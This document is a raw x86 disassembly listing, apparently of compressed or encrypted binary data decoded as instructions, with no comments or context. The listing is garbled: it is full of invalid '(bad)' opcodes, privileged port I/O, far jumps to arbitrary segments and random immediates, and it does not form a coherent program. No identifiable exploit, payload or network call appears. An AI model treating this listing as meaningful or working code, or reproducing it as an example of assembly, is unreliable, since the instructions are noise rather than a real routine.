  416e55:	jp     0x416e82
  416e57:	shl    BYTE PTR [edi],1
  416e59:	push   ds
  416e5a:	outs   dx,DWORD PTR ds:[esi]
  416e5b:	shr    ah,cl
  416e5d:	iret   
  416e5e:	inc    ebx
  416e5f:	push   cs
  416e60:	pusha  
  416e61:	or     DWORD PTR [esp+eax*4],esi
  416e64:	adc    ebx,ebx
  416e66:	dec    esp
  416e67:	mov    esi,0xcae67507
  416e6c:	fstp   TBYTE PTR ds:0x6ea968ff
  416e72:	call   DWORD PTR [esi+0x107344da]
  416e78:	clc    
  416e79:	push   ebx
  416e7a:	jge    0x416ebc
  416e7c:	pop    ss
  416e7d:	xor    esi,esi
  416e7f:	cdq    
  416e80:	or     BYTE PTR [esi+eax*2+0x4a0ed372],bl
  416e87:	inc    ebx
  416e88:	cli    
  416e89:	xchg   esp,eax
  416e8a:	push   esi
  416e8b:	xor    eax,0x92a66761
  416e90:	push   esp
	...
  416ef1:	add    BYTE PTR [eax],al
  416ef3:	add    BYTE PTR [edi-0x519271e7],bh
  416ef9:	(bad)  
  416efa:	(bad)  
  416efb:	fucomi st,st(0)
  416efd:	xor    eax,0x7df18eea
  416f02:	ins    DWORD PTR es:[edi],dx
  416f03:	dec    ebx
  416f04:	jl     0x416ef8
  416f06:	add    BYTE PTR [eax],al
  416f08:	add    eax,0x78000001
  416f0d:	sbb    eax,0x8f565129
  416f12:	out    dx,al
  416f13:	xor    DWORD PTR [edi+0x53],ecx
  416f16:	shl    BYTE PTR [esi+0x63],0x8a
  416f1a:	push   0x1c1fe23
  416f1f:	sub    al,0x58
  416f21:	int    0x2d
  416f23:	add    al,0x51
  416f25:	popf   
  416f26:	xor    ecx,eax
  416f28:	sbb    DWORD PTR [ebp-0x4c3736bc],esp
  416f2e:	je     0x416fab
  416f30:	push   es
  416f31:	popf   
  416f32:	scas   al,BYTE PTR es:[edi]
  416f33:	add    al,0x20
  416f35:	push   es
  416f36:	add    DWORD PTR [edx+ebp*8],edx
  416f39:	fldcw  WORD PTR [esi-0x2c]
  416f3c:	pop    es
  416f3d:	imul   eax,DWORD PTR [ebx-0x79167ee5],0x79
  416f44:	das    
  416f45:	xchg   DWORD PTR [edx],ecx
  416f47:	test   DWORD PTR ds:0x66fb3dd5,esi
  416f4d:	add    ebx,ebp
  416f4f:	leave  
  416f50:	mov    edi,0xa24dbe07
  416f55:	(bad)  
  416f56:	stc    
  416f57:	and    eax,0xc4efb300
  416f5c:	push   esi
  416f5d:	inc    ecx
  416f5e:	leave  
  416f5f:	mov    DWORD PTR [ebx+0x7e62cd40],ebp
  416f65:	sbb    DWORD PTR [esi+0x73272b36],ebp
  416f6b:	mov    ds:0x626af6ae,eax
  416f70:	outs   dx,DWORD PTR ds:[esi]
  416f71:	neg    BYTE PTR [ebp-0x6ad8cd8c]
  416f77:	adc    bl,BYTE PTR cs:[edi+0x30]
  416f7b:	or     DWORD PTR [ecx+0x65],esp
  416f7e:	inc    ebx
  416f7f:	ret    
  416f80:	pop    esi
  416f81:	xchg   ecx,eax
  416f82:	aaa    
  416f83:	cli    
  416f84:	addr16 cdq 
  416f86:	repnz enter 0xadda,0x34
  416f8b:	ret    0x362
  416f8e:	mov    ebp,0x7ccb880e
  416f93:	mov    ch,0xac
  416f95:	fist   WORD PTR [ebp+esi*1+0x5474ebe6]
  416f9c:	inc    esp
  416f9d:	xchg   dh,dh
  416f9f:	frstor [eax+0x2c4b7c57]
  416fa5:	repnz into 
  416fa7:	adc    al,0xbe
  416fa9:	cld    
  416faa:	mov    ecx,0x4abf6c5d
  416faf:	inc    ebx
  416fb0:	ins    DWORD PTR es:[edi],dx
  416fb1:	and    BYTE PTR [eax],cl
  416fb3:	push   0x5cd927e7
  416fb8:	push   eax
  416fb9:	(bad)  
  416fba:	mov    edx,0x55994025
  416fbf:	sub    DWORD PTR [edi],0x1d
  416fc2:	jmp    0xe32b:0xebd8648b
  416fc9:	dec    ecx
  416fca:	dec    ebp
  416fcb:	cmp    edx,ebx
  416fcd:	repz daa 
  416fcf:	dec    eax
  416fd0:	pop    es
  416fd1:	data16 addr16 xchg dx,ax
  416fd5:	cmp    al,0x53
  416fd7:	cwde   
  416fd8:	repz or DWORD PTR [ebx+0x3b46be5d],ebp
  416fdf:	push   ebp
  416fe0:	xchg   ecx,eax
  416fe1:	aas    
  416fe2:	loopne 0x416fd1
  416fe4:	mov    edi,0xad84cb1
  416fe9:	inc    ecx
  416fea:	addr16 data16 aad 0xd8
  416fee:	cmp    al,0xf8
  416ff0:	sub    eax,0x8ab78d59
  416ff5:	and    edi,ebx
  416ff7:	scas   eax,DWORD PTR es:[edi]
  416ff8:	fsubrp st(2),st
  416ffa:	cs aam 0x5
  416ffd:	xor    al,0xee
  416fff:	pop    edx
  417000:	adc    bh,dl
  417002:	adc    dh,BYTE PTR [ecx]
  417004:	imul   edx,DWORD PTR [ebp+0x2fd69f42],0xffffffd5
  41700b:	retf   0xcf44
  41700e:	aaa    
  41700f:	sti    
  417010:	pop    ecx
	...
  417071:	add    BYTE PTR [eax],al
  417073:	add    BYTE PTR [esi+0x2d],dh
  417076:	push   ebp
  417077:	inc    ecx
  417078:	pop    edi
  417079:	jns    0x4170f1
  41707b:	aas    
  41707c:	(bad)  
  41707d:	loopne 0x417073
  41707f:	sub    esi,DWORD PTR [esi]
  417081:	fsubr  QWORD PTR [edx+0xf38171]
  417087:	add    BYTE PTR ds:0xb9000001,al
  41708d:	xchg   esi,eax
  41708e:	out    0xa8,eax
  417090:	enterw 0x9125,0x3e
  417095:	jmp    0xbef8:0x61aea0d2
  41709c:	mov    dh,0x85
  41709e:	sub    ebx,esp
  4170a0:	lds    ecx,FWORD PTR [eax+0x318f42f1]
  4170a6:	or     al,0x54
  4170a8:	push   eax
  4170a9:	mov    al,ds:0x1d72cbd9
  4170ae:	push   cs
  4170af:	xchg   edx,eax
  4170b0:	mov    esi,ebx
  4170b2:	and    eax,0xe38fad6c
  4170b7:	dec    DWORD PTR [ebx]
  4170b9:	inc    edx
  4170ba:	jmp    0x6c13:0xde5af011
  4170c1:	sub    ebp,0xfffffffd
  4170c4:	or     BYTE PTR [ebx+0x12],dh
  4170c7:	pop    ds
  4170c8:	dec    ebx
  4170c9:	outs   dx,BYTE PTR ds:[esi]
  4170ca:	adc    BYTE PTR [esi],dh
  4170cc:	bound  edx,QWORD PTR [esp+ecx*4]
  4170cf:	in     eax,0x25
  4170d1:	xchg   DWORD PTR [edx+0x2593b4],edx
  4170d7:	dec    ecx
  4170d8:	sbb    al,0x56
  4170da:	inc    ebp
  4170db:	inc    edx
  4170dc:	adc    BYTE PTR [ebx+ecx*4-0x700932fe],ah
  4170e3:	cmp    DWORD PTR [eax-0x19],edi
  4170e6:	stos   BYTE PTR es:[edi],al
  4170e7:	mov    bl,0xe8
  4170e9:	iret   
  4170ea:	bound  edi,QWORD PTR [ebx]
  4170ec:	xor    BYTE PTR [ebp-0x6d],0xe2
  4170f0:	inc    ebx
  4170f1:	jae    0x4170c7
  4170f3:	sar    bh,cl
  4170f5:	and    DWORD PTR fs:[esi],edi
  4170f8:	sub    ch,ch
  4170fa:	dec    ebx
  4170fb:	in     eax,0xc2
  4170fd:	xchg   ebx,eax
  4170fe:	pop    eax
  4170ff:	enter  0xc8a7,0x85
  417103:	jae    0x41710e
  417105:	and    cl,BYTE PTR [ecx+edi*2+0x3a]
  417109:	mov    cl,0x7
  41710b:	sub    BYTE PTR ds:0x8ec9acd6,bl
  417111:	pop    ds
  417112:	xchg   esp,eax
  417113:	and    dh,BYTE PTR [edi-0x2876a2]
  417119:	sbb    ch,BYTE PTR [edi-0x197da418]
  41711f:	dec    esp
  417120:	iret   
  417121:	in     eax,dx
  417122:	out    0x2c,eax
  417124:	cdq    
  417125:	and    eax,0xb9e88233
  41712a:	std    
  41712b:	in     al,dx
  41712c:	mov    DWORD PTR [eax+0x79],ecx
  41712f:	je     0x417115
  417131:	mov    esi,0x832b1fa0
  417136:	scas   al,BYTE PTR es:[edi]
  417137:	(bad)  
  417138:	pop    edi
  417139:	aas    
  41713a:	and    DWORD PTR [eax+ebp*4-0x2d],ecx
  41713e:	pop    esp
  41713f:	add    DWORD PTR [eax-0x72],ebp
  417142:	xchg   edx,eax
  417143:	(bad)  
  417144:	shl    ch,cl
  417146:	repnz xchg edx,eax
  417148:	(bad)  
  417149:	mov    ds:0x8c126b2d,al
  41714e:	jns    0x41710f
  417150:	lds    ebx,FWORD PTR ds:0xf3dad460
  417156:	js     0x4170ea
  417158:	push   0xc
  41715a:	mov    esi,0x6c0147a6
  41715f:	and    al,0x71
  417161:	jbe    0x417152
  417163:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417164:	jno    0x4171d7
  417166:	sub    al,0xee
  417168:	dec    edi
  417169:	xlat   BYTE PTR ds:[ebx]
  41716a:	inc    ebp
  41716b:	inc    eax
  41716c:	jno    0x417193
  41716e:	add    al,0x58
  417170:	fidiv  WORD PTR [eax+0x5c03d2b7]
  417176:	sub    bh,BYTE PTR [edx+0x5079c206]
  41717c:	ja     0x4171e0
  41717e:	rcl    edx,0x8d
  417181:	push   edx
  417182:	int    0xbc
  417184:	shl    cl,cl
  417186:	dec    edx
  417187:	int3   
  417188:	cmp    BYTE PTR [edx-0x6486b271],ah
  41718e:	jns    0x417177
  417190:	lock add BYTE PTR [eax],al
	...
  4171f3:	add    BYTE PTR [esi-0xe58fe7],ah
  4171f9:	jnp    0x4171e9
  4171fb:	mov    ebp,0x986526a4
  417200:	cwde   
  417201:	pop    ss
  417202:	jb     0x41725f
  417204:	xchg   ah,dh
  417206:	add    BYTE PTR [eax],al
  417208:	add    eax,0xf3000001
  41720d:	cmp    eax,DWORD PTR [edi]
  41720f:	test   BYTE PTR [ebp-0x30bbf0f],ah
  417215:	mov    bh,0x3f
  417217:	fbld   TBYTE PTR [ebx+edi*1]
  41721a:	adc    BYTE PTR [edi+0x49],bh
  41721d:	sbb    al,0x4b
  41721f:	dec    esi
  417220:	shr    DWORD PTR [esi],1
  417222:	and    DWORD PTR [ebp+0x52],esi
  417225:	jle    0x4171d7
  417227:	cmp    al,0xe1
  417229:	push   ecx
  41722a:	inc    edx
  41722b:	dec    ebp
  41722c:	lea    esi,[edi-0x5bbf7fea]
  417232:	je     0x4171f2
  417234:	pop    eax
  417235:	test   ax,0x6674
  417239:	adc    edx,DWORD PTR [esi-0x25c8738b]
  41723f:	cli    
  417240:	test   BYTE PTR [ebx+0x4b],dl
  417243:	xor    BYTE PTR [eax],bh
  417245:	in     al,0xf3
  417247:	fisub  WORD PTR [esi-0x3e539812]
  41724d:	sub    dh,ah
  41724f:	stos   BYTE PTR es:[edi],al
  417250:	popa   
  417251:	test   DWORD PTR [esi+0x4d97e15c],ebp
  417257:	cmp    ebp,DWORD PTR [ecx+eiz*1+0x38147b07]
  41725e:	dec    ecx
  41725f:	push   ebp
  417260:	loop   0x4171e3
  417262:	mov    esp,0x61c8b7e4
  417267:	inc    esi
  417268:	cs aaa 
  41726a:	lea    eax,[eax+0x21b30f1c]
  417270:	lock mov cl,0x42
  417273:	mov    dl,BYTE PTR [eax]
  417275:	inc    eax
  417276:	push   es
  417277:	and    al,0x24
  417279:	dec    esp
  41727a:	pop    esp
  41727b:	mov    edx,0xc880fb16
  417280:	sahf   
  417281:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417282:	pop    eax
  417283:	mov    BYTE PTR [eax+0x24],al
  417286:	adc    bh,BYTE PTR [ebx+0x3f]
  417289:	inc    eax
  41728a:	or     ebp,DWORD PTR [edx]
  41728c:	out    dx,eax
  41728d:	xchg   ebx,eax
  41728e:	cmp    al,BYTE PTR [eax]
  417290:	stos   DWORD PTR es:[edi],eax
  417291:	mov    eax,0x57cc93e3
  417296:	xor    al,0xb3
  417298:	(bad)  
  417299:	jb     0x41724b
  41729b:	push   esp
  41729c:	xor    al,0x6b
  41729e:	sahf   
  41729f:	xchg   ebx,eax
  4172a0:	hlt    
  4172a1:	adc    esi,DWORD PTR ds:0x629dadb
  4172a7:	push   ecx
  4172a8:	xchg   DWORD PTR [edx-0x27],edi
  4172ab:	retf   0xe598
  4172ae:	sti    
  4172af:	pop    ecx
  4172b0:	push   esi
  4172b1:	add    eax,0x2765041c
  4172b6:	mov    esi,0xdbfaa282
  4172bb:	xlat   BYTE PTR ds:[ebx]
  4172bc:	je     0x4172f4
  4172be:	dec    edx
  4172bf:	dec    ebx
  4172c0:	nop
  4172c1:	daa    
  4172c2:	sbb    eax,0xc1d1cc99
  4172c7:	mov    ch,0x76
  4172c9:	sbb    BYTE PTR [esi-0x2ef112de],bl
  4172cf:	sbb    al,0x3c
  4172d1:	add    eax,esi
  4172d3:	adc    esp,eax
  4172d5:	dec    edi
  4172d6:	jmp    0xc42c:0x47a364fd
  4172dd:	int3   
  4172de:	icebp  
  4172df:	inc    ecx
  4172e0:	rcl    DWORD PTR [ebp-0x3831e9a9],0x7d
  4172e7:	push   edx
  4172e8:	or     BYTE PTR ds:0x95652cd6,dl
  4172ee:	je     0x4172a5
  4172f0:	pop    edx
  4172f1:	sbb    edi,DWORD PTR [eax]
  4172f3:	outs   dx,DWORD PTR ds:[esi]
  4172f4:	xor    al,0x3e
  4172f6:	std    
  4172f7:	cs loop 0x417374
  4172fa:	push   ebx
  4172fb:	rcr    DWORD PTR [edi-0x41b51425],1
  417301:	jmp    0x4172c3
  417303:	call   0x9d12:0x5f02b08f
  41730a:	test   eax,0x4c7e21fa
  41730f:	sub    DWORD PTR [edi],esi
	...
  417371:	add    BYTE PTR [eax],al
  417373:	add    BYTE PTR [ecx-0x44],ch
  417376:	xlat   BYTE PTR ds:[ebx]
  417377:	pop    esi
  417378:	xlat   BYTE PTR ds:[ebx]
  417379:	jg     0x417364
  41737b:	mov    edi,0x6508016b
  417380:	or     al,0xb4
  417382:	and    edx,DWORD PTR [ebx+ecx*4]
  417385:	cmc    
  417386:	add    BYTE PTR [eax],al
  417388:	add    eax,0xa0000001
  41738d:	and    al,dh
  41738f:	jnp    0x41734a
  417391:	mov    bl,0x35
  417393:	enter  0x870b,0xa2
  417397:	xchg   ebx,eax
  417398:	and    DWORD PTR [ebp+0x571b65b1],edi
  41739e:	jmp    0x34e0:0x23333149
  4173a5:	pop    ecx
  4173a6:	(bad)  
  4173a7:	ja     0x4173af
  4173a9:	adc    BYTE PTR [esi-0x31af0988],0xdd
  4173b0:	dec    ebx
  4173b1:	xchg   edx,eax
  4173b2:	fisubr DWORD PTR [eax]
  4173b4:	(bad)  [ecx]
  4173b6:	pop    ebx
  4173b7:	adc    al,0xa0
  4173b9:	fsub   QWORD PTR [esi-0x38d69f80]
  4173bf:	jne    0x4173ed
  4173c1:	fwait
  4173c2:	test   BYTE PTR [eax+ecx*2],bl
  4173c5:	(bad)  
  4173c6:	not    BYTE PTR [edx-0x3b]
  4173c9:	jp     0x417435
  4173cb:	(bad)  
  4173cc:	jmp    0x6b68:0x1f2ad503
  4173d3:	mov    cs,WORD PTR [esi+0x2731d1fd]
  4173d9:	lods   eax,DWORD PTR ds:[esi]
  4173da:	or     bh,dh
  4173dc:	mov    dl,0xb5
  4173de:	fcom   DWORD PTR [ebx]
  4173e0:	sub    ecx,ebp
  4173e2:	jmp    0x417436
  4173e4:	sub    eax,esp
  4173e6:	fiadd  DWORD PTR [edx+0x1b]
  4173e9:	stos   BYTE PTR es:[edi],al
  4173ea:	not    esi
  4173ec:	ds out dx,eax
  4173ee:	fmul   DWORD PTR [edi]
  4173f0:	js     0x417464
  4173f2:	or     al,0x49
  4173f4:	cmp    ebp,ecx
  4173f6:	retf   
  4173f7:	pop    edi
  4173f8:	pop    esi
  4173f9:	xor    edx,DWORD PTR [ebx]
  4173fb:	pop    ecx
  4173fc:	dec    ebp
  4173fd:	push   ss
  4173fe:	imul   BYTE PTR [eax-0x5cde1b60]
  417404:	jecxz  0x417451
  417406:	jns    0x4173ad
  417408:	aad    0xb0
  41740a:	daa    
  41740b:	leave  
  41740c:	lock mov BYTE PTR [eax],al
  41740f:	and    al,0xde
  417411:	add    bh,BYTE PTR [si+0x7de2]
  417416:	and    eax,0x4f73483d
  41741b:	sbb    DWORD PTR [ebp+0x6aba4b6c],esi
  417421:	and    al,0x3d
  417423:	in     al,0x57
  417425:	adc    al,0xfd
  417427:	xor    dh,cl
  417429:	mov    bh,0xe6
  41742b:	fisub  WORD PTR [edx+0x23]
  41742e:	xchg   esp,eax
  41742f:	pop    ebp
  417430:	cli    
  417431:	scas   ax,WORD PTR es:[edi]
  417433:	scas   eax,DWORD PTR es:[edi]
  417434:	lock jae 0x417499
  417437:	push   ds
  417438:	sbb    DWORD PTR [edx],ebp
  41743a:	pushf  
  41743b:	jb     0x41743c
  41743d:	sahf   
  41743e:	sub    al,0x61
  417440:	inc    ebp
  417441:	or     eax,0xbb42c52f
  417446:	aam    0xec
  417448:	push   cs
  417449:	and    dh,cl
  41744b:	mov    al,ds:0xe700b398
  417450:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417451:	bound  eax,QWORD PTR [ecx-0x3c7bb0d5]
  417457:	aam    0x58
  417459:	shl    eax,cl
  41745b:	push   es
  41745c:	mov    DWORD PTR [ecx],esi
  41745e:	imul   edi,DWORD PTR [edx],0xd6a35c4
  417464:	xchg   esi,eax
  417465:	jo     0x4174e3
  417467:	(bad)  
  417468:	stos   DWORD PTR es:[edi],eax
  417469:	nop
  41746a:	leave  
  41746b:	std    
  41746c:	ret    0x1db0
  41746f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417470:	pop    edi
  417471:	aas    
  417472:	xchg   edi,eax
  417473:	jp     0x41746d
  417475:	sub    cl,cl
  417477:	mov    DWORD PTR [edi],ebp
  417479:	fisttp DWORD PTR [edx]
  41747b:	sub    BYTE PTR [ebx+ebx*4+0x38],0xbf
  417480:	and    ch,BYTE PTR [ecx]
  417482:	mov    edx,0x9798f557
  417487:	pop    ss
  417488:	hlt    
  417489:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41748a:	push   esp
  41748b:	ret    0x754
  41748e:	mov    cs,WORD PTR [edx+0x90]
	...
  4174f4:	xchg   ecx,eax
  4174f5:	mov    edx,0xdc6b0c6a
  4174fa:	idiv   DWORD PTR [edi+0x212a686b]
  417500:	adc    eax,0x9068d1b0
  417505:	test   BYTE PTR [eax],0x0
  417508:	add    eax,0xa000001
  41750d:	cdq    
  41750e:	fild   QWORD PTR [esi-0x40b385a3]
  417514:	push   ebx
  417515:	out    0x90,al
  417517:	mov    BYTE PTR [edx-0x578bc879],ch
  41751d:	sbb    eax,0x1aeabefc
  417522:	and    DWORD PTR [ecx+0x206b3e9c],ebp
  417528:	popa   
  417529:	xchg   edx,eax
  41752a:	inc    edi
  41752b:	out    dx,al
  41752c:	hlt    
  41752d:	dec    ecx
  41752e:	retf   
  41752f:	push   ecx
  417530:	and    edi,DWORD PTR ds:0xe5d5a87d
  417536:	or     ebp,ebx
  417538:	dec    edx
  417539:	aas    
  41753a:	retf   
  41753b:	cmp    eax,0xeb93c43b
  417540:	call   0x9084:0x4dccd9ea
  417547:	lods   eax,DWORD PTR ds:[esi]
  417548:	push   cs
  417549:	nop
  41754a:	sub    ecx,DWORD PTR [eax]
  41754c:	rcr    BYTE PTR [ebp+0x6],cl
  41754f:	mov    BYTE PTR [eax-0x1e],bl
  417552:	and    al,0x0
  417554:	fbstp  TBYTE PTR [edi-0x19771c29]
  41755a:	push   ss
  41755b:	ret    0xd184
  41755e:	cwde   
  41755f:	std    
  417560:	adc    eax,0x1085fa2
  417565:	cld    
  417566:	and    eax,0xb4549c8e
  41756b:	pop    ebx
  41756c:	dec    esp
  41756d:	test   BYTE PTR [edi-0x581d2ca3],ah
  417573:	jl     0x4175e8
  417575:	cmovs  ebp,DWORD PTR [ecx+0x39]
  417579:	sub    eax,0x883a38e3
  41757e:	sbb    esp,esi
  417580:	test   al,0xb9
  417582:	push   ds
  417583:	push   cs
  417584:	ss mov dl,0x93
  417587:	mov    fs,WORD PTR [eax]
  417589:	xchg   esp,eax
  41758a:	jbe    0x4175c3
  41758c:	sub    al,0xbf
  41758e:	adc    DWORD PTR [ecx+0x13b7cc60],0x37
  417595:	xchg   esp,eax
  417596:	dec    ebx
  417597:	div    ch
  417599:	ds shr bl,1
  41759c:	dec    ebx
  41759d:	add    BYTE PTR [edi-0x6cf99cb2],cl
  4175a3:	mov    ah,0x71
  4175a5:	ss pop ebx
  4175a7:	inc    esp
  4175a8:	outs   dx,DWORD PTR ds:[esi]
  4175a9:	ins    DWORD PTR es:[edi],dx
  4175aa:	pop    es
  4175ab:	shr    ebp,1
  4175ad:	shr    BYTE PTR [ecx+0x47f85ddc],1
  4175b3:	mov    bh,0x7a
  4175b5:	sbb    dh,ah
  4175b7:	push   ds
  4175b8:	xor    eax,0x810992aa
  4175bd:	das    
  4175be:	sbb    BYTE PTR [esi+ecx*8-0x721dee55],al
  4175c5:	pop    esi
  4175c6:	cli    
  4175c7:	mov    al,0x22
  4175c9:	retf   
  4175ca:	data16 sahf 
  4175cc:	sti    
  4175cd:	jecxz  0x4175b6
  4175cf:	sub    esi,edi
  4175d1:	out    0x9c,al
  4175d3:	push   0x5e11378d
  4175d8:	outs   dx,DWORD PTR ds:[esi]
  4175d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175da:	sbb    DWORD PTR [eax+edi*2-0x5e1cd6f5],eax
  4175e1:	mov    ecx,0xb9666836
  4175e6:	out    dx,eax
  4175e7:	loop   0x417591
  4175e9:	out    0xa7,al
  4175eb:	pop    ebx
  4175ec:	jl     0x417610
  4175ee:	imul   esp,esi,0x34d93554
  4175f4:	sub    DWORD PTR [ebp-0x62],eax
  4175f7:	or     ebx,DWORD PTR [edi]
  4175f9:	repnz xor DWORD PTR [edx+0x472ace11],edx
  417600:	dec    eax
  417601:	sbb    DWORD PTR [eax-0x1f735f50],eax
  417607:	enter  0xbd7e,0x5a
  41760b:	aad    0xa0
  41760d:	xchg   ecx,eax
  41760e:	cwde   
  41760f:	pop    ecx
  417610:	mov    eax,0x0
	...
  417671:	add    BYTE PTR [eax],al
  417673:	add    BYTE PTR [ecx-0x20b02c99],ch
  417679:	(bad)  
  41767a:	mov    ebp,0x411f24e7
  41767f:	(bad)  
  417681:	pusha  
  417682:	call   0x0:0xf795
  417688:	add    eax,0xde000001
  41768d:	les    eax,FWORD PTR [eax+0x45]
  417690:	push   ebx
  417691:	jg     0x41764e
  417693:	les    edx,FWORD PTR [esi]
  417695:	(bad)  
  417696:	icebp  
  417697:	pop    es
  417698:	or     edi,DWORD PTR [ecx-0x17]
  41769b:	inc    esi
  41769c:	jne    0x417634
  41769e:	sbb    ch,BYTE PTR [eax-0x7e]
  4176a1:	or     DWORD PTR [edx+0x64],0xffffffe9
  4176a5:	mov    esi,eax
  4176a7:	and    DWORD PTR [edx-0x1d9de23b],edi
  4176ad:	dec    eax
  4176ae:	call   0x4477693e
  4176b3:	stos   DWORD PTR es:[edi],eax
  4176b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176b5:	or     dl,BYTE PTR [ecx+0x2ba792ea]
  4176bb:	inc    esi
  4176bc:	mov    esi,0x3030f947
  4176c1:	ja     0x41764a
  4176c3:	pop    ebx
  4176c4:	into   
  4176c5:	test   DWORD PTR [eax+0x7d],0xd326c412
  4176cc:	pop    es
  4176cd:	cmp    BYTE PTR [ebp-0x18],cl
  4176d0:	inc    edx
  4176d1:	add    BYTE PTR [ebx],dl
  4176d3:	out    dx,al
  4176d4:	mov    ecx,0xc15292c7
  4176d9:	sbb    BYTE PTR [eax-0x2c],bl
  4176dc:	stos   DWORD PTR es:[edi],eax
  4176dd:	fwait
  4176de:	add    esi,DWORD PTR [ecx-0x98eaa9a]
  4176e4:	inc    eax
  4176e5:	fild   WORD PTR [edx]
  4176e7:	mov    cl,0x76
  4176e9:	push   ecx
  4176ea:	pop    ebp
  4176eb:	xchg   esi,eax
  4176ec:	push   ecx
  4176ed:	push   esi
  4176ee:	aad    0x11
  4176f0:	inc    ebx
  4176f1:	mov    cl,0x9a
  4176f3:	or     eax,DWORD PTR [edx]
  4176f5:	mov    ch,BYTE PTR [ebx-0x2f260a9c]
  4176fb:	addr16 fldl2t 
  4176fe:	out    0xfc,eax
  417700:	cmp    DWORD PTR [ecx-0x5b39711d],ebp
  417706:	push   eax
  417707:	popf   
  417708:	jns    0x417702
  41770a:	lock das 
  41770c:	fbld   TBYTE PTR [ecx]
  41770e:	mov    edx,0xbbb70238
  417713:	sbb    al,0xd3
  417715:	xchg   ebp,eax
  417716:	push   edi
  417717:	mov    edx,0x614133ec
  41771c:	fstp   TBYTE PTR [ebp+0x73]
  41771f:	popa   
  417720:	outs   dx,DWORD PTR ds:[esi]
  417721:	add    ah,BYTE PTR [ebx+0x258a26f6]
  417727:	jns    0x41776b
  417729:	and    al,0xf7
  41772b:	ja     0x4176ba
  41772d:	xor    edx,DWORD PTR [eax]
  41772f:	retf   0xa60a
  417732:	lods   al,BYTE PTR ds:[esi]
  417733:	outs   dx,BYTE PTR ds:[esi]
  417734:	xchg   edx,eax
  417735:	ja     0x4176bb
  417737:	sbb    al,BYTE PTR [edx+0x47f745ea]
  41773d:	sub    eax,0x36
  417740:	xor    edx,edx
  417742:	ja     0x41779d
  417744:	mov    al,ds:0xbc814727
  417749:	lds    ebp,FWORD PTR [esi-0x49]
  41774c:	stos   DWORD PTR es:[edi],eax
  41774d:	mov    es,edi
  41774f:	outs   dx,DWORD PTR ds:[esi]
  417750:	test   al,0x4f
  417752:	add    bh,0xcc
  417755:	dec    edi
  417756:	add    ch,BYTE PTR [bp+di]
  417759:	push   ebp
  41775a:	cmp    DWORD PTR [ebx],esi
  41775c:	mov    cl,0x48
  41775e:	scas   eax,DWORD PTR es:[edi]
  41775f:	leave  
  417760:	mov    BYTE PTR [ebx+0x3cbe4365],bl
  417766:	push   0xffffffd1
  417768:	adc    eax,0x809ef7d3
  41776d:	pop    ss
  41776e:	sbb    bl,ah
  417770:	push   edx
  417771:	daa    
  417772:	mov    ecx,0xaed67a16
  417777:	push   eax
  417778:	fucomp st(3)
  41777a:	pop    edi
  41777b:	sbb    bh,BYTE PTR [ebx]
  41777d:	icebp  
  41777e:	je     0x417782
  417780:	inc    ebx
  417781:	pop    ecx
  417782:	inc    eax
  417783:	or     DWORD PTR [ebp+0x3ba6316],edi
  417789:	pop    es
  41778a:	jb     0x417804
  41778c:	jae    0x4177a6
  41778e:	push   ds
  41778f:	cli    
  417790:	das    
	...
  4177f1:	add    BYTE PTR [eax],al
  4177f3:	add    cl,ch
  4177f5:	push   cs
  4177f6:	(bad)  
  4177f7:	pop    ss
  4177f8:	push   edi
  4177fa:	jmp    0x233417fd
  4177ff:	shl    BYTE PTR [ebx-0x65eb5ff9],cl
  417805:	clc    
  417806:	add    BYTE PTR [eax],al
  417808:	add    eax,0x19000001
  41780d:	mov    ecx,0xe35494d0
  417812:	rol    edi,cl
  417814:	inc    esi
  417815:	scas   eax,DWORD PTR es:[edi]
  417816:	dec    ecx
  417817:	sbb    al,0xea
  417819:	and    DWORD PTR [ebx],ebx
  41781b:	loop   0x4177f4
  41781d:	or     DWORD PTR [ecx+0x76],eax
  417820:	pop    ebx
  417821:	inc    ebx
  417822:	jp     0x417892
  417824:	repnz cmp al,0x40
  417827:	push   ecx
  417828:	(bad)  
  417829:	pop    ecx
  41782a:	sbb    edi,DWORD PTR [ebx]
  41782c:	inc    ebx
  41782d:	aad    0x50
  41782f:	or     eax,0x3372ee0c
  417834:	dec    edi
  417835:	les    ecx,FWORD PTR [edx+0x5]
  417838:	mov    al,0x2e
  41783a:	and    al,0x62
  41783c:	retf   
  41783d:	outs   dx,BYTE PTR ds:[esi]
  41783e:	add    DWORD PTR [ecx-0x74512ce3],ecx
  417844:	jbe    0x41782c
  417846:	imul   eax,DWORD PTR [esp+ebp*4],0xffffffae
  41784a:	iret   
  41784b:	xor    al,0x13
  41784d:	ret    0xd95e
  417850:	aad    0x5b
  417852:	ret    0x59e4
  417855:	retf   
  417856:	arpl   WORD PTR [ecx+edi*1+0x4a],sp
  41785a:	and    DWORD PTR ss:[edi-0x7db8af86],edi
  417861:	cli    
  417862:	(bad)  
  417863:	ja     0x4178d2
  417865:	cmc    
  417866:	call   0x39df:0xc0758e2b
  41786d:	mov    ds:0x3ecc0c9b,al
  417872:	sub    BYTE PTR [edx+0x30],dl
  417875:	arpl   WORD PTR [eax+edi*2+0x50],cx
  417879:	dec    edi
  41787a:	loopne 0x41780e
  41787c:	int    0x8
  41787e:	fcomip st,st(4)
  417880:	cwde   
  417881:	fst    QWORD PTR [eax-0x7be4c5d5]
  417887:	scas   al,BYTE PTR es:[edi]
  417888:	repnz mov dh,0x1d
  41788b:	or     DWORD PTR [edx+edi*4-0x349f339f],0x41763534
  417896:	aaa    
  417897:	xchg   ebx,eax
  417898:	jecxz  0x4178a1
  41789a:	sar    DWORD PTR ds:0xb4070768,0x62
  4178a1:	pop    ss
  4178a2:	mov    al,0x7b
  4178a4:	xchg   ebx,eax
  4178a5:	sbb    dh,BYTE PTR [ecx-0x4b5ed94f]
  4178ab:	in     al,0xdf
  4178ad:	or     BYTE PTR [edx],ah
  4178af:	sbb    al,0x10
  4178b1:	retf   0x2ca7
  4178b4:	and    eax,0x9eac0c34
  4178b9:	xchg   esi,eax
  4178ba:	lds    esp,FWORD PTR [ecx+0x0]
  4178bd:	in     al,0xe0
  4178bf:	sub    al,0xc9
  4178c1:	xchg   edi,eax
  4178c2:	div    ecx
  4178c4:	jg     0x4178ba
  4178c6:	aas    
  4178c7:	inc    edi
